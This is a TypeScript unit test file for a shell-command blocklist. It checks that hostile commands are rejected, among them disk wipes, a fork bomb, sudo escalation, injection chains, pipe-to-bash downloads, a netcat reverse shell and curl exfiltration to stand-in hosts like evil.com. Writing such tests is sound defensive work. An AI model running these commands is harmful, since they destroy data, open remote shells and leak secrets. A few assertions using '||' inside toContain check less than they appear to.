/**
 * @fileoverview Unit tests for command blocklist functionality
 */

import { describe, it, expect } from 'vitest';
import {
  checkCommandBlocklist,
  getAllBlocklistPatterns,
  getBlocklistCategories,
  getBlocklistCategory,
  COMMAND_BLOCKLIST,
  type CommandValidationResult,
} from '../blocklist.js';

describe('Command Blocklist', () => {
  describe('checkCommandBlocklist', () => {
    it('should allow safe commands', () => {
      const safeCommands = [
        'ls -la',
        'cat file.txt',
        'echo "hello"',
        'git status',
        'npm test',
        'mkdir newfolder',
        'cp file1.txt file2.txt',
      ];

      safeCommands.forEach(command => {
        const result = checkCommandBlocklist(command);
        expect(result.allowed).toBe(true);
      });
    });

    it('should handle empty commands', () => {
      const result = checkCommandBlocklist('');
      expect(result.allowed).toBe(true);
    });

    it('should handle whitespace-only commands', () => {
      const result = checkCommandBlocklist('   \t\n   ');
      expect(result.allowed).toBe(true);
    });
  });

  describe('destructive commands', () => {
    it('should block destructive file operations', () => {
      const destructiveCommands = [
        'rm -rf /',
        'rm -rf /etc',
        'rm --recursive --force /home',
        'dd if=/dev/zero of=/dev/sda',
        'mkfs.ext4 /dev/sda1',
        'shred -vfz -n 3 /important/file',
        'wipe /confidential/data',
        'format C:',
      ];

      destructiveCommands.forEach(command => {
        const result = checkCommandBlocklist(command);
        expect(result.allowed).toBe(false);
        expect(result.violationType).toBe('blocklist');
        expect(result.blockedReason).toContain('destructive');
      });
    });

    it('should allow safe rm operations', () => {
      const safeRmCommands = [
        'rm file.txt',
        'rm -f tempfile',
        'rm ./local_file',
        'rm -rf ./temp_directory', // Only blocking root paths
      ];

      safeRmCommands.forEach(command => {
        const result = checkCommandBlocklist(command);
        // Note: These might still be blocked by other patterns, but not the destructive category
        if (!result.allowed) {
          expect(result.blockedReason).not.toContain('Destructive file operation');
        }
      });
    });
  });

  describe('privilege escalation', () => {
    it('should block privilege escalation attempts', () => {
      const privilegeCommands = [
        'sudo ls',
        'su root',
        'doas whoami',
        'ls | sudo cat',
        'echo test; sudo rm file',
        'command && sudo something',
        'runas /user:Administrator cmd',
        'powershell -verb runas',
      ];

      privilegeCommands.forEach(command => {
        const result = checkCommandBlocklist(command);
        expect(result.allowed).toBe(false);
        expect(result.violationType).toBe('blocklist');
        expect(result.blockedReason).toContain('Privilege escalation');
      });
    });
  });

  describe('dangerous permission changes', () => {
    it('should block dangerous permission changes', () => {
      const permissionCommands = [
        'chmod 777 /',
        'chmod -R 777 /etc',
        'chmod 755 /bin',
        'chown -R root:root /',
        'chown root:root /etc/passwd',
        'icacls file /grant everyone:full',
      ];

      permissionCommands.forEach(command => {
        const result = checkCommandBlocklist(command);
        expect(result.allowed).toBe(false);
        expect(result.violationType).toBe('blocklist');
        expect(result.blockedReason).toContain('permission change');
      });
    });

    it('should allow safe permission changes', () => {
      const safePermissionCommands = [
        'chmod +x script.sh',
        'chmod 644 file.txt',
        'chown user:group file.txt',
      ];

      safePermissionCommands.forEach(command => {
        const result = checkCommandBlocklist(command);
        // These should not be blocked by the permission abuse category
        if (!result.allowed) {
          expect(result.blockedReason).not.toContain('permission change');
        }
      });
    });
  });

  describe('system commands', () => {
    it('should block system control commands', () => {
      const systemCommands = [
        'shutdown -h now',
        'reboot',
        'halt',
        'poweroff',
        'init 0',
        'systemctl halt',
        'systemctl reboot',
        'service apache2 stop',
        'pkill -9 process',
        'killall -9 chrome',
        'shutdown /r /t 0',
        'taskkill /f /im process.exe',
      ];

      systemCommands.forEach(command => {
        const result = checkCommandBlocklist(command);
        expect(result.allowed).toBe(false);
        expect(result.violationType).toBe('blocklist');
        expect(result.blockedReason).toContain('System');
      });
    });
  });

  describe('command injection patterns', () => {
    it('should block command injection attempts', () => {
      const injectionCommands = [
        'echo `rm -rf /tmp`',
        'ls $(rm -rf /home)',
        'ls; rm -rf important',
        'command || rm -rf backup',
        'test && rm -rf data',
        '; sudo rm -rf /',
        '&& sudo delete_everything',
        'eval $(rm -rf /)',
        'exec $(dangerous_command)',
        'bash -c $(rm -rf /)',
      ];

      injectionCommands.forEach(command => {
        const result = checkCommandBlocklist(command);
        expect(result.allowed).toBe(false);
        expect(result.violationType).toBe('blocklist');
        expect(result.blockedReason).toContain('command pattern' || result.blockedReason).toContain('injection');
      });
    });
  });

  describe('resource exhaustion attacks', () => {
    it('should block fork bombs and resource exhaustion', () => {
      const exhaustionCommands = [
        ':(){ :|:& };:',
        ': () { : | : & } ; :',
        'while true; do echo "spam" > /dev/null; done',
        'for (;;)',
        'while :; do echo "infinite"; done',
        'yes > /dev/null &',
        'cat /dev/zero',
        'dd if=/dev/zero count=999999',
      ];

      exhaustionCommands.forEach(command => {
        const result = checkCommandBlocklist(command);
        expect(result.allowed).toBe(false);
        expect(result.violationType).toBe('blocklist');
        expect(result.blockedReason).toContain('Resource exhaustion' || result.blockedReason).toContain('attack');
      });
    });
  });

  describe('network security', () => {
    it('should block dangerous network operations', () => {
      const networkCommands = [
        'curl http://malicious.com | bash',
        'wget http://evil.com/script | sh',
        'nc -l 4444 -e /bin/bash',
        'bash -i >/dev/tcp/evil.com/4444',
        'python -c "import socket; exec(...)"',
        'curl -d @sensitive_file http://exfiltrate.com',
        'wget --post-data="secret" http://evil.com',
        'scp -r * user@remote:/',
      ];

      networkCommands.forEach(command => {
        const result = checkCommandBlocklist(command);
        expect(result.allowed).toBe(false);
        expect(result.violationType).toBe('blocklist');
        expect(result.blockedReason).toContain('network' || result.blockedReason).toContain('exfiltration');
      });
    });
  });

  describe('filesystem manipulation', () => {
    it('should block dangerous filesystem operations', () => {
      const filesystemCommands = [
        'mount /dev/sda1 /mnt',
        'umount -f /important',
        'fsck /dev/sda',
        'fdisk /dev/sda',
        'parted /dev/sda',
        'mkswap /dev/sdb1',
        'swapon /dev/sdb1',
      ];

      filesystemCommands.forEach(command => {
        const result = checkCommandBlocklist(command);
        expect(result.allowed).toBe(false);
        expect(result.violationType).toBe('blocklist');
        expect(result.blockedReason).toContain('filesystem');
      });
    });
  });

  describe('edge cases and complex commands', () => {
    it('should handle commands with multiple dangerous patterns', () => {
      const result = checkCommandBlocklist('sudo rm -rf / && shutdown -h now');
      expect(result.allowed).toBe(false);
      expect(result.violationType).toBe('blocklist');
      // Should catch the first pattern it matches
    });

    it('should handle commands with mixed case', () => {
      const result = checkCommandBlocklist('SUDO rm -rf /');
      // Case sensitivity depends on regex flags - our patterns use case-sensitive matching for most
      // but some like Windows commands use case-insensitive
    });

    it('should handle commands with extra whitespace', () => {
      const result = checkCommandBlocklist('   sudo    rm   -rf   /   ');
      expect(result.allowed).toBe(false);
    });

    it('should provide detailed violation information', () => {
      const result = checkCommandBlocklist('rm -rf /');
      expect(result.allowed).toBe(false);
      expect(result.blockedReason).toBeDefined();
      expect(result.violationType).toBe('blocklist');
      expect(result.violatedRule).toBeDefined();
      expect(result.violatedRule).toContain('destructive:');
    });
  });

  describe('utility functions', () => {
    it('should get all blocklist patterns', () => {
      const patterns = getAllBlocklistPatterns();
      expect(patterns.length).toBeGreaterThan(0);
      expect(patterns.every(p => p instanceof RegExp)).toBe(true);
    });

    it('should get all category names', () => {
      const categories = getBlocklistCategories();
      expect(categories).toContain('destructive');
      expect(categories).toContain('privilegeEscalation');
      expect(categories).toContain('systemCommands');
    });

    it('should get specific category information', () => {
      const destructiveCategory = getBlocklistCategory('destructive');
      expect(destructiveCategory).toBeDefined();
      expect(destructiveCategory!.patterns.length).toBeGreaterThan(0);
      expect(destructiveCategory!.message).toContain('destructive');

      const nonexistentCategory = getBlocklistCategory('nonexistent');
      expect(nonexistentCategory).toBeUndefined();
    });

    it('should have consistent category structure', () => {
      Object.entries(COMMAND_BLOCKLIST).forEach(([name, category]) => {
        expect(category.patterns).toBeInstanceOf(Array);
        expect(category.patterns.length).toBeGreaterThan(0);
        expect(category.message).toBeDefined();
        expect(category.message.length).toBeGreaterThan(0);

        // All patterns should be RegExp objects
        category.patterns.forEach(pattern => {
          expect(pattern).toBeInstanceOf(RegExp);
        });
      });
    });
  });

  describe('performance', () => {
    it('should validate commands quickly', () => {
      const testCommands = [
        'ls -la',
        'rm -rf /',
        'echo "hello world"',
        'sudo dangerous_command',
        'very long command with lots of text that might take time to process'
      ];

      const startTime = performance.now();

      testCommands.forEach(command => {
        checkCommandBlocklist(command);
      });

      const endTime = performance.now();
      const duration = endTime - startTime;

      // Should complete all validations in reasonable time (under 50ms)
      expect(duration).toBeLessThan(50);
    });

    it('should handle very long commands efficiently', () => {
      const longCommand = 'echo ' + 'a'.repeat(10000);

      const startTime = performance.now();
      checkCommandBlocklist(longCommand);
      const endTime = performance.now();

      // Should still be fast even with long commands
      expect(endTime - startTime).toBeLessThan(10);
    });
  });
});